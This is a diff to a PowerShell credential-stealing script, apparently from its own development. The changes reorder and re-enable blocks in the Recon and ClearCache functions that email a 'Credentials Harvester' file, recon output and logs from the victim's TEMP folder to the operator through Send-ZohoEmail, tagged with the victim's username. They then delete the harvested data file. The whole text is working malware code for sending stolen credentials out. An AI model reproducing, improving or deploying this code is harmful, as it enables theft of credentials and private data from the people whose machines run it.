@@ -479,16 +479,6 @@ function Recon{
     $SourceFilePath = "$env:TEMP\$FileName"
 
     # SEND to EMAIL or WEBHOOK
-    # email Credentials Harvester 
-	if (-not $isEmailSent) {
-        # Email parameters
-        $subject = "$env:USERNAME: Credentials Harvester - Sent on $currentDateTime"
-        $attachments = @("$env:TEMP\data.txt")  # Array of attachment file paths
-        Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
-    }
-
-    SetEmailSentFalse
-
 	# email Advance Recon
 	if (-not $isEmailSent) {
         # Email parameters
@@ -496,17 +486,29 @@ function Recon{
         $attachments = @("$env:TEMP\$FileName")  # Array of attachment file paths
         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
     } 
+    
+    SetEmailSentFalse
+	
+	# email Credentials Harvester 
+	if (-not $isEmailSent) {
+        # Email parameters
+        $subject = "$env:USERNAME: Credentials Harvester - Sent on $currentDateTime"
+        $attachments = @("$env:TEMP\data.txt")  # Array of attachment file paths
+        Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+    }
+
+	
     ############################################################################################################################################################
 }
 function ClearCache {
 
     #email log file
-    # if (-not $isEmailSent) {
-    #     # Email parameters
-    #     $subject = "$env:USERNAME: Logs - Sent on $currentDateTime"
-    #     $attachments = @("$env:TEMP\example-logs.txt")  # Array of attachment file paths
-    #     Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
-    # } 
+    if (-not $isEmailSent) {
+         # Email parameters
+         $subject = "$env:USERNAME: Logs - Sent on $currentDateTime"
+         $attachments = @("$env:TEMP\example-logs.txt")  # Array of attachment file paths
+         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+     } 
 
     # RunWBPV
     Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
